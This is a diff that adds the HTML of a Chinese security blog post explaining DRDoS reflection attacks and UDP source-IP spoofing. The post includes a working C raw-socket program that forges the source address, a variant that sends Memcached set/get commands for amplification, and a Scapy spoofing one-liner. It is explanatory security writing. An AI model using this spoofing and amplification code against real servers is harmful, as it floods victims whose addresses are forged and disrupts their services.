@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析 « 倾旋的博客</title>
+  <meta name="description" content="本文概述一下使用C语言发送伪造源IP的UDP请求及DRDoS拒绝服务攻击原理剖析">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2018-03-04/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析</h1>
+    <p class="post-meta">Mar 4, 2018</p>
+  </header>
+
+  <article class="post-content">
+    <p>本文概述一下使用C语言发送伪造源IP的UDP请求及DRDoS拒绝服务攻击原理剖析
+<!--more--></p>
+
+<ul id="markdown-toc">
+  <li><a href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFdrdos" id="markdown-toc-0x01-什么是drdos">0x01 什么是DRDOS</a></li>
+  <li><a href="#0x02-drdos%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B" id="markdown-toc-0x02-drdos的攻击流程">0x02 DRDOS的攻击流程</a></li>
+  <li>
+<a href="#0x03-drdos%E7%9A%84%E7%89%B9%E6%80%A7" id="markdown-toc-0x03-drdos的特性">0x03 DRDOS的特性</a>    <ul>
+      <li><a href="#jerry%E4%B8%8Etom%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E7%9A%84udp%E8%AF%B7%E6%B1%82" id="markdown-toc-jerry与tom一次正常的udp请求">Jerry与Tom一次正常的UDP请求</a></li>
+      <li><a href="#allen%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1rdos%E6%94%BB%E5%87%BB" id="markdown-toc-allen进行一次rdos攻击">Allen进行一次RDOS攻击</a></li>
+    </ul>
+  </li>
+  <li><a href="#0x04-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E4%BC%AA%E9%80%A0ip%E5%A4%B4%E7%9A%84c%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F" id="markdown-toc-0x04-编写一个伪造ip头的c语言程序">0x04 编写一个伪造IP头的C语言程序</a></li>
+  <li><a href="#0x05-%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F" id="markdown-toc-0x05-其他方式">0x05 其他方式</a></li>
+</ul>
+
+<h2 id="0x01-什么是drdos">0x01 什么是DRDOS</h2>
+
+<p>DRDoS是英文“Distributed Reflection Denial of Service ”的缩写，中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。</p>
+
+<h2 id="0x02-drdos的攻击流程">0x02 DRDOS的攻击流程</h2>
+
+<p>DRDoS要完成一次反射放大攻击：</p>
+
+<ul>
+  <li>1 攻击者，必须提前需要把攻击数据存放在所有的在线肉鸡或者反射服务器之上。</li>
+  <li>2 攻击者，必须伪造IP源头。发送海量伪造IP来源的请求。当然这里的IP就是受害者的IP地址。</li>
+  <li>3 反射服务器，必须可以反射数据，运行良好稳定。最好是请求数据少，返回数据成万倍增加。</li>
+</ul>
+
+<h2 id="0x03-drdos的特性">0x03 DRDOS的特性</h2>
+
+<p>（如果没有理解UDP协议，请不要向下继续阅读……会越来越混乱）</p>
+
+<p>根据上述概念可以理解为，DRDOS需要一个能够伪造IP头的协议，这个协议最突出的就是UDP协议了。</p>
+
+<ol>
+  <li>使用基于 TCP 协议的通信不可以对源 IP 地址进行伪造</li>
+  <li>使用基于 UDP 协议的通信可以对源 IP 地址进行伪造</li>
+</ol>
+
+<p>TCP 不能伪造源 IP 地址是因为 TCP 协议中的三次握手的存在，如果源 IP 地址被修改，那么三次握手将无法达成。</p>
+
+<p>而 UDP 则不同，UDP 中不存在三次握手，那么发送端就只要发送数据即可，而接收端只要接收数据即可。所以，在 TCP 中不能对源 IP 地址进行伪造，而 UDP 中则可以。</p>
+
+<p>UDP协议不需要握手，直接发送接收，下面我来通过小故事来形象的描述UDP中的伪造IP头攻击：</p>
+
+<blockquote>
+  <p>假设有三个用户，Allen、Jerry、Tom.</p>
+</blockquote>
+
+<h3 id="jerry与tom一次正常的udp请求">Jerry与Tom一次正常的UDP请求</h3>
+
+<p><code class="language-plaintext highlighter-rouge">Jerry说：</code>“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”</p>
+
+<p>此时Tom的4478端口接收到一个UDP报文，需要回复内容，回复给谁呢，接下来需要根据报文中的IP头确定是谁发送的</p>
+
+<p>通过Jerry的话确定发送方是Jerry，而Jerry的端口是4787，那么Tom就会将数据传送给Jerry</p>
+
+<p><code class="language-plaintext highlighter-rouge">Tom说：</code>“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”</p>
+
+<h3 id="allen进行一次rdos攻击">Allen进行一次RDOS攻击</h3>
+
+<p><code class="language-plaintext highlighter-rouge">Allen说：</code>“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”</p>
+
+<p>此时Tom接收到报文，根据上面这句话确定了发送人是Jerry，目的端口是4787</p>
+
+<p><code class="language-plaintext highlighter-rouge">Tom说：</code>“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”</p>
+
+<p>这个过程当中，Jerry并没有参与通信，但是接到了一个从Tom那里发送过来的UDP数据报文</p>
+
+<h2 id="0x04-编写一个伪造ip头的c语言程序">0x04 编写一个伪造IP头的C语言程序</h2>
+
+<blockquote>
+  <p>/usr/include/netinet/ip.h</p>
+</blockquote>
+
+<p>这里面定义了IP头</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">ip</span>
+  <span class="p">{</span>
+<span class="cp">#if __BYTE_ORDER == __LITTLE_ENDIAN
+</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ip_hl</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span>		<span class="cm">/* header length */</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ip_v</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span>		<span class="cm">/* version */</span>
+<span class="cp">#endif
+#if __BYTE_ORDER == __BIG_ENDIAN
+</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ip_v</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span>		<span class="cm">/* version */</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ip_hl</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span>		<span class="cm">/* header length */</span>
+<span class="cp">#endif
+</span>    <span class="kt">uint8_t</span> <span class="n">ip_tos</span><span class="p">;</span>			<span class="cm">/* type of service */</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ip_len</span><span class="p">;</span>		<span class="cm">/* total length */</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ip_id</span><span class="p">;</span>		<span class="cm">/* identification */</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ip_off</span><span class="p">;</span>		<span class="cm">/* fragment offset field */</span>
+<span class="cp">#define	IP_RF 0x8000			</span><span class="cm">/* reserved fragment flag */</span><span class="cp">
+#define	IP_DF 0x4000			</span><span class="cm">/* dont fragment flag */</span><span class="cp">
+#define	IP_MF 0x2000			</span><span class="cm">/* more fragments flag */</span><span class="cp">
+#define	IP_OFFMASK 0x1fff		</span><span class="cm">/* mask for fragmenting bits */</span><span class="cp">
+</span>    <span class="kt">uint8_t</span> <span class="n">ip_ttl</span><span class="p">;</span>			<span class="cm">/* time to live */</span>
+    <span class="kt">uint8_t</span> <span class="n">ip_p</span><span class="p">;</span>			<span class="cm">/* protocol */</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ip_sum</span><span class="p">;</span>		<span class="cm">/* checksum */</span>
+    <span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">ip_src</span><span class="p">,</span> <span class="n">ip_dst</span><span class="p">;</span>	<span class="cm">/* source and dest address */</span>
+  <span class="p">};</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>/usr/include/netinet/udp.h</p>
+</blockquote>
+
+<p>这里面定义了UDP报文结构</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">udphdr</span>
+<span class="p">{</span>
+  <span class="n">__extension__</span> <span class="k">union</span>
+  <span class="p">{</span>
+    <span class="k">struct</span>
+    <span class="p">{</span>
+      <span class="kt">uint16_t</span> <span class="n">uh_sport</span><span class="p">;</span>	<span class="cm">/* source port */</span>
+      <span class="kt">uint16_t</span> <span class="n">uh_dport</span><span class="p">;</span>	<span class="cm">/* destination port */</span>
+      <span class="kt">uint16_t</span> <span class="n">uh_ulen</span><span class="p">;</span>		<span class="cm">/* udp length */</span>
+      <span class="kt">uint16_t</span> <span class="n">uh_sum</span><span class="p">;</span>		<span class="cm">/* udp checksum */</span>
+    <span class="p">};</span>
+    <span class="k">struct</span>
+    <span class="p">{</span>
+      <span class="kt">uint16_t</span> <span class="n">source</span><span class="p">;</span>
+      <span class="kt">uint16_t</span> <span class="n">dest</span><span class="p">;</span>
+      <span class="kt">uint16_t</span> <span class="n">len</span><span class="p">;</span>
+      <span class="kt">uint16_t</span> <span class="n">check</span><span class="p">;</span>
+    <span class="p">};</span>
+  <span class="p">};</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>程序如下：</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
+ * @file ip_udp_send.c
+ */</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/udp.h&gt;
+</span>
+<span class="cm">/* ip首部长度 */</span>
+<span class="cp">#define IP_HEADER_LEN sizeof(struct ip)
+</span><span class="cm">/* udp首部长度 */</span>
+<span class="cp">#define UDP_HEADER_LEN sizeof(struct udphdr)
+</span><span class="cm">/* ip首部 + udp首部长度 */</span>
+<span class="cp">#define IP_UDP_HEADER_LEN IP_HEADER_LEN + UDP_HEADER_LEN
+</span>
+<span class="kt">void</span> <span class="nf">err_exit</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">err_msg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="n">err_msg</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/* 填充ip首部 */</span>
+<span class="k">struct</span> <span class="nc">ip</span> <span class="o">*</span><span class="nf">fill_ip_header</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src_ip</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dst_ip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ip_packet_len</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="nc">ip</span> <span class="o">*</span><span class="n">ip_header</span><span class="p">;</span>
+
+    <span class="n">ip_header</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">ip</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">IP_HEADER_LEN</span><span class="p">);</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_v</span> <span class="o">=</span> <span class="n">IPVERSION</span><span class="p">;</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_hl</span> <span class="o">=</span> <span class="n">IP_HEADER_LEN</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_tos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_len</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">ip_packet_len</span><span class="p">);</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_ttl</span> <span class="o">=</span> <span class="n">MAXTTL</span><span class="p">;</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_p</span> <span class="o">=</span> <span class="n">IPPROTO_UDP</span><span class="p">;</span>        <span class="cm">/* 这里是UDP */</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_src</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">src_ip</span><span class="p">);</span>
+    <span class="n">ip_header</span><span class="o">-&gt;</span><span class="n">ip_dst</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">dst_ip</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">ip_header</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* 填充udp首部 */</span>
+<span class="k">struct</span> <span class="nc">udphdr</span> <span class="o">*</span><span class="nf">fill_udp_header</span><span class="p">(</span><span class="kt">int</span> <span class="n">src_port</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dst_port</span><span class="p">,</span> <span class="kt">int</span> <span class="n">udp_packet_len</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="nc">udphdr</span> <span class="o">*</span><span class="n">udp_header</span><span class="p">;</span>
+
+    <span class="n">udp_header</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">udphdr</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">UDP_HEADER_LEN</span><span class="p">);</span>
+    <span class="n">udp_header</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">src_port</span><span class="p">);</span>
+    <span class="n">udp_header</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dst_port</span><span class="p">);</span>
+    <span class="cm">/* 这里的长度是整个UDP报文 */</span>
+    <span class="n">udp_header</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">udp_packet_len</span><span class="p">);</span>
+    <span class="n">udp_header</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="n">udp_header</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* 发送ip_udp报文 */</span>
+<span class="kt">void</span> <span class="nf">ip_udp_send</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src_ip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">src_port</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dst_ip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dst_port</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="nc">ip</span> <span class="o">*</span><span class="n">ip_header</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="nc">udphdr</span> <span class="o">*</span><span class="n">udp_header</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">dst_addr</span><span class="p">;</span>
+    <span class="n">socklen_t</span> <span class="n">sock_addrlen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr_in</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">data_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">ip_packet_len</span> <span class="o">=</span> <span class="n">IP_UDP_HEADER_LEN</span> <span class="o">+</span> <span class="n">data_len</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">udp_packet_len</span> <span class="o">=</span> <span class="n">UDP_HEADER_LEN</span> <span class="o">+</span> <span class="n">data_len</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">ip_packet_len</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">ret_len</span><span class="p">,</span> <span class="n">on</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dst_addr</span><span class="p">,</span> <span class="n">sock_addrlen</span><span class="p">);</span>
+    <span class="n">dst_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">PF_INET</span><span class="p">;</span>
+    <span class="n">dst_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">dst_ip</span><span class="p">);</span>
+    <span class="n">dst_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dst_port</span><span class="p">);</span>
+
+    <span class="cm">/* 创建udp原始套接字 */</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_UDP</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">err_exit</span><span class="p">(</span><span class="s">"socket()"</span><span class="p">);</span>
+
+    <span class="cm">/* 开启IP_HDRINCL，自定义IP首部 */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">on</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">on</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">err_exit</span><span class="p">(</span><span class="s">"setsockopt()"</span><span class="p">);</span>
+
+    <span class="cm">/* ip首部 */</span>
+    <span class="n">ip_header</span> <span class="o">=</span> <span class="n">fill_ip_header</span><span class="p">(</span><span class="n">src_ip</span><span class="p">,</span> <span class="n">dst_ip</span><span class="p">,</span> <span class="n">ip_packet_len</span><span class="p">);</span>
+    <span class="cm">/* udp首部 */</span>
+    <span class="n">udp_header</span> <span class="o">=</span> <span class="n">fill_udp_header</span><span class="p">(</span><span class="n">src_port</span><span class="p">,</span> <span class="n">dst_port</span><span class="p">,</span> <span class="n">udp_packet_len</span><span class="p">);</span>
+
+    <span class="n">bzero</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">ip_packet_len</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">ip_header</span><span class="p">,</span> <span class="n">IP_HEADER_LEN</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">IP_HEADER_LEN</span><span class="p">,</span> <span class="n">udp_header</span><span class="p">,</span> <span class="n">UDP_HEADER_LEN</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">IP_UDP_HEADER_LEN</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">data_len</span><span class="p">);</span>
+
+    <span class="cm">/* 发送报文 */</span>
+    <span class="n">ret_len</span> <span class="o">=</span> <span class="n">sendto</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ip_packet_len</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dst_addr</span><span class="p">,</span> <span class="n">sock_addrlen</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret_len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"sendto() ok!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">"sendto() failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">ip_header</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">udp_header</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"usage:%s src_ip src_port dst_ip dst_port data</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* 发送ip_udp报文 */</span>
+    <span class="n">ip_udp_send</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]),</span> <span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>如果要利用Memcached漏洞：</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"usage:%s src_ip src_port dst_ip dst_port data</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kt">char</span> <span class="n">setBuff</span><span class="p">[</span><span class="mi">65535</span><span class="p">]</span><span class="o">=</span><span class="s">"set AAAA 0 1000"</span><span class="p">;</span>
+    <span class="cm">/* 发送ip_udp报文 */</span>
+    <span class="n">ip_udp_send</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]),</span> <span class="n">setBuff</span><span class="p">);</span>
+    
+    <span class="kt">char</span> <span class="n">getBuff</span><span class="p">[</span><span class="mi">65535</span><span class="p">]</span><span class="o">=</span><span class="s">"get AAAA"</span><span class="p">;</span>
+    <span class="n">ip_udp_send</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]),</span> <span class="n">getBuff</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="0x05-其他方式">0x05 其他方式</h2>
+
+<p>Python Scapy 伪造网络数据包</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+&gt;&gt;&gt; data = "Hello Scapy"
+&gt;&gt;&gt; pkt = IP(src='172.16.2.135', dst='172.16.2.91')/UDP(sport=12345, dport=5555)/data
+&gt;&gt;&gt; send(pkt, inter=1, count=1)
+</code></pre></div></div>
+
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
